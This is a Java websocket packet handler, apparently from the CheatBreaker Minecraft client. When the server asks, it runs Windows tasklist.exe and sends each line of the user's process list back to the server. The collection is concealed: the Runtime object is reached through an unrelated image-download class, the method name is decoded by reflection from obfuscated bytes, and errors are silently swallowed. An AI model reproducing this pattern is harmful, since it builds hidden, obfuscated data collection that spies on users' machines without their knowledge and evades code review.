package com.cheatbreaker.client.network.websocket.server;


import com.cheatbreaker.client.CheatBreaker;
import com.cheatbreaker.client.ui.overlay.friend.MessagesElement;
import com.cheatbreaker.client.network.websocket.WSNetHandler;
import lombok.AllArgsConstructor;
import lombok.Getter;
import net.minecraft.network.PacketBuffer;
import com.cheatbreaker.client.network.websocket.WSPacket;
import com.cheatbreaker.client.network.websocket.client.WSPacketClientProcessList;
import lombok.SneakyThrows;
import net.minecraft.client.renderer.ThreadDownloadImageData;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.util.Collections;

@Getter @AllArgsConstructor
public class WSPacketRequestProcessList extends WSPacket {
    @Override
    public void write(PacketBuffer packetBuffer) {
    }

    @Override
    public void read(PacketBuffer packetBuffer) {
    }

    @Override
    public void process(WSNetHandler wSNetHandler) {
        try {
            String string;
            Object object = this.getProcesses();
            Method method = object.getClass().getMethod(MessagesElement.handleCBProcessBytes(WSPacketClientProcessList.cbProcessBytes));
            method.setAccessible(true);
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader((InputStream)method.invoke(object, new Object[0])));
            while ((string = bufferedReader.readLine()) != null) {
                CheatBreaker.getInstance().getWSNetHandler().sendPacket(new WSPacketClientProcessList(Collections.singletonList(string)));
            }
            method.setAccessible(false);
            bufferedReader.close();
        } catch (Exception exception) {

        }
    }

    @SneakyThrows
    private Object getProcesses() {
        return ThreadDownloadImageData.runtime.exec(System.getenv("windir") + "\\system32\\tasklist.exe");
    }
}
